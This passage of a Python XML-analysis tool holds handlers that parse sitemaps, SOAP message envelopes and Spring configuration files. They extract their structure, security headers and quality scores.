        changefreq_consistency = 1.0 - (len(changefreqs) - 1) / 6 if changefreqs else 0.5
        
        return (priority_consistency + changefreq_consistency) / 2
    
    def _calculate_best_practices_score(self, urls: List[ET.Element], total_urls: int) -> float:
        """Calculate best practices compliance score"""
        score = 0.0
        
        # Check if sitemap size is reasonable
        if total_urls <= 50000:
            score += 0.3
        
        # Check if URLs have proper elements
        urls_with_priority = sum(1 for url in urls if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}priority') is not None)
        if urls_with_priority / total_urls > 0.8:
            score += 0.3
        
        # Check HTTPS usage
        https_count = self._count_https_urls(urls)
        if https_count / total_urls > 0.9:
            score += 0.4
        
        return score
    
    def _check_url_validity(self, urls: List[ET.Element]) -> Dict[str, Any]:
        """Check URL validity"""
        validity = {
            'valid_urls': 0,
            'invalid_urls': 0,
            'issues': []
        }
        
        for url in urls:
            loc = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                url_text = loc.text
                parsed = urlparse(url_text)
                
                if parsed.scheme and parsed.netloc:
                    validity['valid_urls'] += 1
                else:
                    validity['invalid_urls'] += 1
                    validity['issues'].append(f'Invalid URL structure: {url_text[:50]}...')
        
        return validity
    
    def _count_https_urls(self, urls: List[ET.Element]) -> int:
        """Count HTTPS URLs"""
        https_count = 0
        for url in urls:
            loc = url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc')
            if loc is not None and loc.text:
                if loc.text.startswith('https://'):
                    https_count += 1
        return https_count
    
    def _extract_content_summary(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Extract content summary"""
        if is_index:
            sitemaps = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}sitemap')
            return {
                'type': 'sitemap_index',
                'sitemap_count': len(sitemaps),
                'has_lastmod': sum(1 for s in sitemaps if s.find(f'.//{{{self.SITEMAP_NAMESPACE}}}lastmod') is not None)
            }
        else:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            return {
                'type': 'url_sitemap',
                'url_count': len(urls),
                'unique_domains': len(set(urlparse(url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc').text).netloc 
                                        for url in urls[:1000] 
                                        if url.find(f'.//{{{self.SITEMAP_NAMESPACE}}}loc') is not None))
            }
    
    def _extract_seo_summary(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Extract SEO summary"""
        if is_index:
            return {
                'sitemap_organization': 'hierarchical',
                'crawl_optimization': 'index_based'
            }
        else:
            urls = root.findall(f'.//{{{self.SITEMAP_NAMESPACE}}}url')
            priorities = self._analyze_priorities(urls)
            changefreqs = self._analyze_changefreqs(urls)
            
            return {
                'priority_coverage': len(priorities) > 0,
                'changefreq_coverage': len(changefreqs) > 0,
                'https_adoption': self._count_https_urls(urls) / len(urls) if urls else 0,
                'average_priority': self._calculate_average_priority(urls)
            }
    
    def _extract_technical_summary(self, root: ET.Element, is_index: bool) -> Dict[str, Any]:
        """Extract technical summary"""
        total_elements = len(list(root.iter()))
        
        return {
            'namespace': self.SITEMAP_NAMESPACE,
            'total_elements': total_elements,
            'estimated_size': self._estimate_file_size(root),
            'compression_recommended': self._estimate_file_size(root) > 10000,
            'schema_compliant': self._validate_namespace_usage(root)
        }
    
    def _assess_sitemap_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess overall sitemap quality"""
        
        # SEO quality
        seo_analysis = findings.get('seo_analysis', {})
        seo_score = 0.0
        
        priority_dist = seo_analysis.get('priority_distribution', {})
        if priority_dist.get('distribution'):
            seo_score += 0.3
        
        changefreq_dist = seo_analysis.get('changefreq_distribution', {})
        if changefreq_dist.get('distribution'):
            seo_score += 0.3
        
        freshness = seo_analysis.get('content_freshness', {})
        if freshness.get('freshness_percentage', 0) > 50:
            seo_score += 0.4
        
        # Technical quality
        technical = findings.get('technical_analysis', {})
        technical_score = 0.0
        
        if technical.get('namespace_compliance', False):
            technical_score += 0.4
        
        if technical.get('file_size', 0) < 50 * 1024 * 1024:  # Under 50MB
            technical_score += 0.3
        
        schema_validation = technical.get('schema_validation', {})
        if schema_validation.get('namespace_correct', False):
            technical_score += 0.3
        
        # Compliance quality
        compliance = findings.get('compliance_analysis', {})
        compliance_score = 0.0
        
        if compliance.get('namespace_compliance', False):
            compliance_score += 0.5
        
        required_elements = compliance.get('required_elements', {})
        if required_elements.get('loc_compliance', False):
            compliance_score += 0.5
        
        # Performance quality
        performance = findings.get('performance_analysis', {})
        performance_score = 0.0
        
        size_opt = performance.get('size_optimization', {})
        if size_opt.get('size_limit_compliance', False):
            performance_score += 0.5
        
        if len(performance.get('recommendations', [])) == 0:
            performance_score += 0.5
        
        return {
            "seo_optimization": seo_score,
            "technical_quality": technical_score,
            "compliance": compliance_score,
            "performance": performance_score,
            "overall": (seo_score + technical_score + compliance_score + performance_score) / 4
        }
</file>

<file path="src/handlers/soap_envelope_handler.py">
#!/usr/bin/env python3
"""
SOAP Envelope Handler

Analyzes SOAP 1.1 and 1.2 message envelopes to extract headers, body content,
fault information, and security details for web service analysis and security scanning.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SOAPEnvelopeHandler(XMLHandler):
    """Handler for SOAP 1.1 and 1.2 message envelopes"""
    
    # SOAP namespace URIs
    SOAP_11_NS = "http://schemas.xmlsoap.org/soap/envelope/"
    SOAP_12_NS = "http://www.w3.org/2003/05/soap-envelope"
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for SOAP Envelope root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'Envelope':
            confidence = 0.0
            
            # Check for SOAP namespaces in root tag namespace
            if root.tag.startswith('{'):
                root_namespace = root.tag.split('}')[0][1:]
                if self.SOAP_11_NS == root_namespace:
                    confidence += 0.6
                elif self.SOAP_12_NS == root_namespace:
                    confidence += 0.6
            
            # Also check declared namespaces
            for uri in namespaces.values():
                if self.SOAP_11_NS in uri:
                    confidence += 0.6
                    break
                elif self.SOAP_12_NS in uri:
                    confidence += 0.6
                    break
            
            # Check for typical SOAP structure (Body is required)
            if root.find('.//Body') is not None or any('Body' in elem.tag for elem in root):
                confidence += 0.3
            
            # Check for Header (optional but common)
            if root.find('.//Header') is not None or any('Header' in elem.tag for elem in root):
                confidence += 0.1
            
            if confidence >= 0.6:
                return True, min(confidence, 1.0)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Determine SOAP version
        version = "1.1"  # Default
        
        # Check root tag namespace first
        if root.tag.startswith('{'):
            root_namespace = root.tag.split('}')[0][1:]
            if self.SOAP_12_NS == root_namespace:
                version = "1.2"
        
        # Also check declared namespaces
        for uri in namespaces.values():
            if self.SOAP_12_NS in uri:
                version = "1.2"
                break
        
        # Determine message type
        message_type = self._determine_message_type(root)
        
        # Extract target service information
        target_service = self._extract_target_service(root)
        
        metadata = {
            "protocol": "SOAP",
            "category": "web_service_message",
            "message_type": message_type,
            "target_service": target_service,
            "has_security": self._has_security_headers(root),
            "has_addressing": self._has_ws_addressing(root)
        }
        
        return DocumentTypeInfo(
            type_name=f"SOAP {version} {message_type}",
            confidence=0.95,
            version=version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'envelope_info': self._analyze_envelope(root),
            'headers': self._analyze_headers(root),
            'body': self._analyze_body(root),
            'security': self._analyze_security(root),
            'addressing': self._analyze_ws_addressing(root),
            'faults': self._analyze_faults(root),
            'namespaces': self._analyze_namespaces(root),
            'message_metrics': self._calculate_message_metrics(root)
        }
        
        recommendations = [
            "Analyze for security vulnerabilities in SOAP headers",
            "Validate input parameters for injection attacks",
            "Check authentication and authorization mechanisms", 
            "Monitor for sensitive data exposure in messages",
            "Analyze message routing and addressing patterns",
            "Extract for API security testing",
            "Review fault handling and error disclosure"
        ]
        
        ai_use_cases = [
            "Web service security analysis",
            "API vulnerability scanning",
            "Message routing optimization",
            "Authentication pattern detection",
            "Fault analysis and error handling",
            "Performance bottleneck identification",
            "Compliance monitoring (SOX, PCI, etc.)",
            "Service dependency mapping",
            "Message transformation analysis"
        ]
        
        data_inventory = {
            'headers': len(findings['headers']['header_elements']),
            'body_elements': len(findings['body']['body_elements']),
            'security_tokens': len(findings['security']['security_tokens']),
            'faults': len(findings['faults']['fault_details']),
            'namespaces': len(findings['namespaces']['declared_namespaces'])
        }
        
        return SpecializedAnalysis(
            document_type=f"SOAP {findings['envelope_info']['version']} Message",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_message_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'message_metadata': {
                'version': self._get_soap_version(root),
                'type': self._determine_message_type(root),
                'target_service': self._extract_target_service(root)
            },
            'security_summary': self._extract_security_summary(root),
            'operation_info': self._extract_operation_info(root),
            'addressing_info': self._extract_addressing_summary(root),
            'fault_summary': self._extract_fault_summary(root)
        }
    
    def _determine_message_type(self, root: ET.Element) -> str:
        """Determine if this is a request, response, or fault message"""
        
        # Check for fault first - look in Body
        body = self._find_element_by_local_name(root, 'Body')
        if body is not None:
            if self._find_element_by_local_name(body, 'Fault') is not None:
                return "Fault"
        
        # Look for response patterns
        body = self._find_element_by_local_name(root, 'Body')
        if body is not None:
            for child in body:
                child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
                if 'Response' in child_name or 'Result' in child_name:
                    return "Response"
        
        # Check for WS-Addressing action
        action = self._extract_ws_addressing_action(root)
        if action:
            if 'Response' in action or '/response' in action.lower():
                return "Response"
        
        # Default to request
        return "Request"
    
    def _get_soap_version(self, root: ET.Element) -> str:
        """Determine SOAP version from namespace"""
        if root.tag.startswith('{'):
            namespace = root.tag.split('}')[0][1:]
            if self.SOAP_12_NS == namespace:
                return "1.2"
        return "1.1"
    
    def _extract_target_service(self, root: ET.Element) -> Optional[str]:
        """Extract target service from WS-Addressing To header"""
        headers = self._find_element_by_local_name(root, 'Header')
        if headers is not None:
            to_elem = self._find_element_by_local_name(headers, 'To')
            if to_elem is not None and to_elem.text:
                return to_elem.text
        return None
    
    def _has_security_headers(self, root: ET.Element) -> bool:
        """Check if message has security headers"""
        headers = self._find_element_by_local_name(root, 'Header')
        if headers is not None:
            # Common security header names
            security_elements = ['Security', 'UsernameToken', 'BinarySecurityToken', 'Authentication']
            for elem in headers.iter():
                local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                if local_name in security_elements:
                    return True
        return False
    
    def _has_ws_addressing(self, root: ET.Element) -> bool:
        """Check if message uses WS-Addressing"""
        headers = self._find_element_by_local_name(root, 'Header')
        if headers is not None:
            addressing_elements = ['To', 'From', 'ReplyTo', 'Action', 'MessageID', 'RelatesTo']
            for elem in headers.iter():
                local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                if local_name in addressing_elements:
                    return True
        return False
    
    def _analyze_envelope(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SOAP envelope properties"""
        return {
            'version': self._get_soap_version(root),
            'message_type': self._determine_message_type(root),
            'has_header': self._find_element_by_local_name(root, 'Header') is not None,
            'has_body': self._find_element_by_local_name(root, 'Body') is not None,
            'envelope_attributes': dict(root.attrib),
            'encoding_style': root.get('encodingStyle', 'document/literal')
        }
    
    def _analyze_headers(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SOAP headers"""
        headers_info = {
            'header_count': 0,
            'header_elements': [],
            'must_understand_headers': [],
            'actor_headers': [],
            'security_headers': [],
            'addressing_headers': []
        }
        
        header = self._find_element_by_local_name(root, 'Header')
        if header is not None:
            for child in header:
                child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
                
                header_info = {
                    'name': child_name,
                    'namespace': child.tag.split('}')[0][1:] if '}' in child.tag else None,
                    'must_understand': child.get('mustUnderstand') == '1',
                    'actor': child.get('actor'),
                    'role': child.get('role'),
                    'attributes': dict(child.attrib)
                }
                
                headers_info['header_elements'].append(header_info)
                headers_info['header_count'] += 1
                
                # Categorize headers
                if header_info['must_understand']:
                    headers_info['must_understand_headers'].append(child_name)
                
                if header_info['actor'] or header_info['role']:
                    headers_info['actor_headers'].append(child_name)
                
                # Check for security headers
                if any(sec in child_name for sec in ['Security', 'Auth', 'Token', 'Credential']):
                    headers_info['security_headers'].append(child_name)
                
                # Check for addressing headers
                if any(addr in child_name for addr in ['To', 'From', 'Action', 'MessageID', 'RelatesTo']):
                    headers_info['addressing_headers'].append(child_name)
        
        return headers_info
    
    def _analyze_body(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SOAP body content"""
        body_info = {
            'has_body': False,
            'body_elements': [],
            'operation': None,
            'parameters': [],
            'is_fault': False,
            'body_size_estimate': 0
        }
        
        body = self._find_element_by_local_name(root, 'Body')
        if body is not None:
            body_info['has_body'] = True
            body_info['body_size_estimate'] = len(ET.tostring(body, encoding='unicode'))
            
            for child in body:
                child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
                
                element_info = {
                    'name': child_name,
                    'namespace': child.tag.split('}')[0][1:] if '}' in child.tag else None,
                    'parameter_count': len(list(child)),
                    'attributes': dict(child.attrib)
                }
                
                body_info['body_elements'].append(element_info)
                
                # Determine operation name
                if child_name == 'Fault':
                    body_info['is_fault'] = True
                    body_info['operation'] = 'Fault'
                elif not body_info['operation']:
                    body_info['operation'] = child_name
                
                # Extract parameters
                for param in child:
                    param_name = param.tag.split('}')[-1] if '}' in param.tag else param.tag
                    body_info['parameters'].append({
                        'name': param_name,
                        'value': param.text,
                        'type': param.get('type'),
                        'has_children': len(list(param)) > 0
                    })
        
        return body_info
    
    def _analyze_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security-related headers and tokens"""
        security_info = {
            'has_security': False,
            'security_tokens': [],
            'authentication_methods': [],
            'encryption_info': {},
            'signature_info': {},
            'security_risks': []
        }
        
        headers = self._find_element_by_local_name(root, 'Header')
        if headers is not None:
            # Look for WS-Security elements
            for elem in headers.iter():
                elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                
                if elem_name == 'Security':
                    security_info['has_security'] = True
                    
                    # Analyze security tokens
                    for token_elem in elem:
                        token_name = token_elem.tag.split('}')[-1] if '}' in token_elem.tag else token_elem.tag
                        
                        token_info = {
                            'type': token_name,
                            'attributes': dict(token_elem.attrib)
                        }
                        
                        if token_name == 'UsernameToken':
                            username = self._find_element_by_local_name(token_elem, 'Username')
                            password = self._find_element_by_local_name(token_elem, 'Password')
                            
                            token_info['username'] = username.text if username is not None else None
                            token_info['password_type'] = password.get('Type') if password is not None else None
                            
                            security_info['authentication_methods'].append('UsernameToken')
                            
                            # Check for security risks
                            if password is not None and password.get('Type', '').endswith('#PasswordText'):
                                security_info['security_risks'].append('Plain text password in UsernameToken')
                        
                        elif token_name == 'BinarySecurityToken':
                            token_info['encoding_type'] = token_elem.get('EncodingType')
                            token_info['value_type'] = token_elem.get('ValueType')
                            security_info['authentication_methods'].append('BinarySecurityToken')
                        
                        security_info['security_tokens'].append(token_info)
                
                # Check for authentication headers outside WS-Security
                elif elem_name in ['Authentication', 'Credentials']:
                    security_info['has_security'] = True
                    security_info['authentication_methods'].append(elem_name)
        
        return security_info
    
    def _analyze_ws_addressing(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze WS-Addressing headers"""
        addressing_info = {
            'has_addressing': False,
            'to': None,
            'from': None,
            'reply_to': None,
            'fault_to': None,
            'action': None,
            'message_id': None,
            'relates_to': [],
            'addressing_version': None
        }
        
        headers = self._find_element_by_local_name(root, 'Header')
        if headers is not None:
            addressing_elements = {
                'To': 'to',
                'From': 'from', 
                'ReplyTo': 'reply_to',
                'FaultTo': 'fault_to',
                'Action': 'action',
                'MessageID': 'message_id'
            }
            
            for elem in headers.iter():
                elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                
                if elem_name in addressing_elements:
                    addressing_info['has_addressing'] = True
                    field_name = addressing_elements[elem_name]
                    addressing_info[field_name] = elem.text
                    
                    # Determine addressing version from namespace
                    if '}' in elem.tag:
                        namespace = elem.tag.split('}')[0][1:]
                        if '2005/08/addressing' in namespace:
                            addressing_info['addressing_version'] = '1.0'
                        elif '2004/08/addressing' in namespace:
                            addressing_info['addressing_version'] = '2004/08'
                
                elif elem_name == 'RelatesTo':
                    addressing_info['has_addressing'] = True
                    addressing_info['relates_to'].append({
                        'value': elem.text,
                        'relationship_type': elem.get('RelationshipType', 'Reply')
                    })
        
        return addressing_info
    
    def _analyze_faults(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SOAP fault information"""
        fault_info = {
            'is_fault': False,
            'fault_details': [],
            'fault_summary': {}
        }
        
        fault = self._find_element_by_local_name(root, 'Fault')
        if fault is not None:
            fault_info['is_fault'] = True
            
            # SOAP 1.1 fault structure
            fault_code = self._find_element_by_local_name(fault, 'faultcode')
            fault_string = self._find_element_by_local_name(fault, 'faultstring')
            fault_actor = self._find_element_by_local_name(fault, 'faultactor')
            detail = self._find_element_by_local_name(fault, 'detail')
            
            # SOAP 1.2 fault structure
            if fault_code is None:
                fault_code = self._find_element_by_local_name(fault, 'Code')
            if fault_string is None:
                fault_string = self._find_element_by_local_name(fault, 'Reason')
            
            fault_details = {
                'code': fault_code.text if fault_code is not None else None,
                'string': fault_string.text if fault_string is not None else None,
                'actor': fault_actor.text if fault_actor is not None else None,
                'detail': self._extract_fault_detail(detail) if detail is not None else None
            }
            
            fault_info['fault_details'].append(fault_details)
            fault_info['fault_summary'] = fault_details
        
        return fault_info
    
    def _analyze_namespaces(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze namespace declarations"""
        namespaces_info = {
            'declared_namespaces': {},
            'soap_namespace': None,
            'target_namespace': None,
            'common_namespaces': []
        }
        
        # Extract all namespace declarations
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':', 1)[1] if ':' in key else 'default'
                namespaces_info['declared_namespaces'][prefix] = value
                
                # Identify SOAP namespace
                if self.SOAP_11_NS in value or self.SOAP_12_NS in value:
                    namespaces_info['soap_namespace'] = value
                
                # Identify common namespaces
                if 'addressing' in value:
                    namespaces_info['common_namespaces'].append('WS-Addressing')
                elif 'wssecurity' in value or 'secext' in value:
                    namespaces_info['common_namespaces'].append('WS-Security')
                elif 'xmlsoap.org' in value and 'wsdl' in value:
                    namespaces_info['common_namespaces'].append('WSDL')
        
        return namespaces_info
    
    def _calculate_message_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate message complexity and size metrics"""
        metrics = {
            'total_elements': 0,
            'header_elements': 0,
            'body_elements': 0,
            'max_depth': 0,
            'namespace_count': 0,
            'security_complexity': 0,
            'message_size_estimate': 0
        }
        
        # Count elements
        metrics['total_elements'] = len(list(root.iter()))
        
        header = self._find_element_by_local_name(root, 'Header')
        if header is not None:
            metrics['header_elements'] = len(list(header.iter())) - 1  # Exclude header itself
        
        body = self._find_element_by_local_name(root, 'Body') 
        if body is not None:
            metrics['body_elements'] = len(list(body.iter())) - 1  # Exclude body itself
        
        # Calculate depth
        metrics['max_depth'] = self._calculate_max_depth(root)
        
        # Count namespaces
        metrics['namespace_count'] = len([k for k in root.attrib.keys() if k.startswith('xmlns')])
        
        # Security complexity score
        if self._has_security_headers(root):
            metrics['security_complexity'] += 1
        if self._has_ws_addressing(root):
            metrics['security_complexity'] += 0.5
        
        # Estimate message size
        try:
            metrics['message_size_estimate'] = len(ET.tostring(root, encoding='unicode'))
        except:
            metrics['message_size_estimate'] = 0
        
        return metrics
    
    def _extract_security_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract security summary information"""
        return {
            'has_security': self._has_security_headers(root),
            'authentication_present': len(self._analyze_security(root)['authentication_methods']) > 0,
            'security_risks': self._analyze_security(root)['security_risks'],
            'token_count': len(self._analyze_security(root)['security_tokens'])
        }
    
    def _extract_operation_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract operation information from body"""
        body_analysis = self._analyze_body(root)
        return {
            'operation': body_analysis['operation'],
            'is_fault': body_analysis['is_fault'],
            'parameter_count': len(body_analysis['parameters']),
            'parameters': body_analysis['parameters'][:5]  # Limit to first 5
        }
    
    def _extract_addressing_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract WS-Addressing summary"""
        addressing = self._analyze_ws_addressing(root)
        return {
            'has_addressing': addressing['has_addressing'],
            'action': addressing['action'],
            'message_id': addressing['message_id'],
            'target': addressing['to']
        }
    
    def _extract_fault_summary(self, root: ET.Element) -> Optional[Dict[str, str]]:
        """Extract fault summary if present"""
        fault_analysis = self._analyze_faults(root)
        if fault_analysis['is_fault'] and fault_analysis['fault_details']:
            fault = fault_analysis['fault_details'][0]
            return {
                'code': fault['code'],
                'message': fault['string'],
                'actor': fault['actor']
            }
        return None
    
    def _extract_ws_addressing_action(self, root: ET.Element) -> Optional[str]:
        """Extract WS-Addressing Action header"""
        headers = self._find_element_by_local_name(root, 'Header') 
        if headers is not None:
            action = self._find_element_by_local_name(headers, 'Action')
            if action is not None:
                return action.text
        return None
    
    def _extract_fault_detail(self, detail: ET.Element) -> Dict[str, Any]:
        """Extract fault detail information"""
        detail_info = {
            'elements': [],
            'text_content': detail.text
        }
        
        for child in detail:
            child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
            detail_info['elements'].append({
                'name': child_name,
                'text': child.text,
                'attributes': dict(child.attrib)
            })
        
        return detail_info
    
    def _find_element_by_local_name(self, parent: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find element by local name, ignoring namespace"""
        for elem in parent:
            elem_local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_local_name == local_name:
                return elem
        return None
    
    def _calculate_max_depth(self, elem: ET.Element, depth: int = 0) -> int:
        """Calculate maximum depth of element tree"""
        if not list(elem):
            return depth
        return max(self._calculate_max_depth(child, depth + 1) for child in elem)
    
    def _assess_message_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess SOAP message quality and security"""
        
        # Security quality
        security_score = 0.0
        if findings['security']['has_security']:
            security_score += 0.4
            if not findings['security']['security_risks']:
                security_score += 0.3
            if 'BinarySecurityToken' in findings['security']['authentication_methods']:
                security_score += 0.2
            else:
                security_score += 0.1
        
        # Message structure quality  
        structure_score = 0.0
        if findings['envelope_info']['has_header']:
            structure_score += 0.3
        if findings['envelope_info']['has_body']:
            structure_score += 0.4
        if findings['addressing']['has_addressing']:
            structure_score += 0.3
        
        # Complexity management (lower complexity is better for maintainability)
        complexity_metrics = findings['message_metrics']
        complexity_score = 1.0
        if complexity_metrics['total_elements'] > 50:
            complexity_score -= 0.2
        if complexity_metrics['max_depth'] > 10:
            complexity_score -= 0.2
        if complexity_metrics['namespace_count'] > 10:
            complexity_score -= 0.1
        complexity_score = max(0, complexity_score)
        
        # Standards compliance
        compliance_score = 0.8  # Base score
        if findings['faults']['is_fault']:
            # Fault messages should have proper structure
            if findings['faults']['fault_summary'].get('code') and findings['faults']['fault_summary'].get('string'):
                compliance_score += 0.2
        elif findings['addressing']['has_addressing']:
            # Request/response should have proper addressing
            compliance_score += 0.2
        
        compliance_score = min(compliance_score, 1.0)
        
        return {
            "security": security_score,
            "structure": structure_score,
            "complexity_management": complexity_score,
            "standards_compliance": compliance_score,
            "overall": (security_score + structure_score + complexity_score + compliance_score) / 4
        }
</file>

<file path="src/handlers/spring_config_handler.py">
#!/usr/bin/env python3
"""
Spring Framework XML Configuration Handler

Analyzes Spring Framework XML configuration files including bean definitions,
dependency injection configurations, and application context files. Supports
extraction of beans, profiles, property sources, and various Spring features
like AOP, security, and transaction management.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SpringConfigHandler(XMLHandler):
    """Handler for Spring Framework XML configuration files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for Spring namespaces
        spring_indicators = [
            'springframework.org/schema/beans',
            'springframework.org/schema/context',
            'springframework.org/schema/mvc'
        ]
        
        if any(ind in str(namespaces.values()) for ind in spring_indicators):
            return True, 1.0
        
        # Check for beans root element
        if root.tag == 'beans' or root.tag.endswith('}beans'):
            return True, 0.7
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect Spring version from schema
        version = "5.x"  # Default
        for uri in namespaces.values():
            if 'springframework.org/schema' in uri:
                version_match = re.search(r'/(\d+\.\d+)\.xsd', uri)
                if version_match:
                    version = version_match.group(1)
                    break
        
        return DocumentTypeInfo(
            type_name="Spring Configuration",
            confidence=1.0,
            version=version,
            metadata={
                "framework": "Spring Framework",
                "category": "dependency_injection"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'beans': self._analyze_beans(root),
            'profiles': self._extract_profiles(root),
            'imports': self._extract_imports(root),
            'property_sources': self._extract_property_sources(root),
            'aop_config': self._check_aop_usage(root),
            'security_config': self._check_security_config(root)
        }
        
        recommendations = [
            "Review bean dependencies for circular references",
            "Check for hardcoded values that should be externalized",
            "Validate security configurations",
            "Consider migrating to annotation-based config"
        ]
        
        ai_use_cases = [
            "Dependency graph visualization",
            "Security misconfiguration detection",
            "Migration to modern Spring Boot",
            "Configuration optimization",
            "Circular dependency detection"
        ]
        
        return SpecializedAnalysis(
            document_type="Spring Configuration",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'beans': len(findings['beans']['all']),
                'profiles': len(findings['profiles']),
                'property_sources': len(findings['property_sources'])
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_spring_config_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'bean_definitions': self._extract_bean_definitions(root),
            'component_scans': self._extract_component_scans(root),
            'configurations': self._extract_configurations(root)
        }
    
    def _analyze_beans(self, root: ET.Element, namespaces: Dict[str, str] = None) -> Dict[str, Any]:
        beans = []
        bean_classes = {}
        
        for bean in root.findall('.//*[@id]'):
            if bean.tag.endswith('bean') or bean.tag == 'bean':
                bean_info = {
                    'id': bean.get('id'),
                    'class': bean.get('class'),
                    'scope': bean.get('scope', 'singleton'),
                    'lazy': bean.get('lazy-init', 'false'),
                    'parent': bean.get('parent')
                }
                beans.append(bean_info)
                
                # Count bean classes
                if bean_info['class']:
                    bean_classes[bean_info['class']] = bean_classes.get(bean_info['class'], 0) + 1
        
        return {
            'all': beans,
            'count': len(beans),
            'by_scope': self._count_by_attribute(beans, 'scope'),
            'lazy_count': sum(1 for b in beans if b['lazy'] == 'true'),
            'common_classes': {k: v for k, v in bean_classes.items() if v > 1}
        }
    
    def _extract_profiles(self, root: ET.Element) -> List[str]:
        profiles = set()
        
        for elem in root.findall('.//*[@profile]'):
            profile = elem.get('profile')
            if profile:
                # Handle multiple profiles
                for p in profile.split(','):
                    profiles.add(p.strip())
        
        return list(profiles)
    
    def _extract_imports(self, root: ET.Element) -> List[str]:
        imports = []
        
        for imp in root.findall('.//import'):
            resource = imp.get('resource')
            if resource:
                imports.append(resource)
        
        return imports
    
    def _extract_property_sources(self, root: ET.Element) -> List[Dict[str, str]]:
        sources = []
        
        # Look for property placeholder configurers
        for elem in root.findall('.//*'):
            if 'PropertyPlaceholderConfigurer' in elem.get('class', ''):
                location = elem.find('.//property[@name="location"]')
                if location is not None:
                    sources.append({
                        'type': 'properties',
                        'location': location.get('value')
                    })
        
        return sources
    
    def _check_aop_usage(self, root: ET.Element) -> bool:
        # Check for AOP namespace or AOP-related beans
        for elem in root.iter():
            if 'aop' in elem.tag or 'aspectj' in elem.tag.lower():
                return True
        return False
    
    def _check_security_config(self, root: ET.Element) -> Dict[str, Any]:
        security = {
            'present': False,
            'authentication': False,
            'authorization': False
        }
        
        for elem in root.iter():
            if 'security' in elem.tag:
                security['present'] = True
            if 'authentication' in elem.tag:
                security['authentication'] = True
            if 'authorization' in elem.tag or 'access' in elem.tag:
                security['authorization'] = True
        
        return security
    
    def _extract_bean_definitions(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Simplified version - full implementation would extract all properties
        return self._analyze_beans(root)['all'][:20]  # First 20 beans
    
    def _extract_component_scans(self, root: ET.Element) -> List[str]:
        scans = []
        
        for scan in root.findall('.//*component-scan'):
            base_package = scan.get('base-package')
            if base_package:
                scans.append(base_package)
        
        return scans
    
    def _extract_configurations(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'transaction_management': self._check_transaction_config(root),
            'caching': self._check_cache_config(root),
            'scheduling': self._check_scheduling_config(root)
        }
    
    def _check_transaction_config(self, root: ET.Element) -> bool:
        return any('transaction' in elem.tag for elem in root.iter())
    
    def _check_cache_config(self, root: ET.Element) -> bool:
        return any('cache' in elem.tag for elem in root.iter())
    
    def _check_scheduling_config(self, root: ET.Element) -> bool:
        return any('task' in elem.tag or 'scheduling' in elem.tag for elem in root.iter())
    
    def _count_by_attribute(self, items: List[Dict], attr: str) -> Dict[str, int]:
        counts = {}
        for item in items:
            value = item.get(attr)
            if value:
                counts[value] = counts.get(value, 0) + 1
        return counts
    
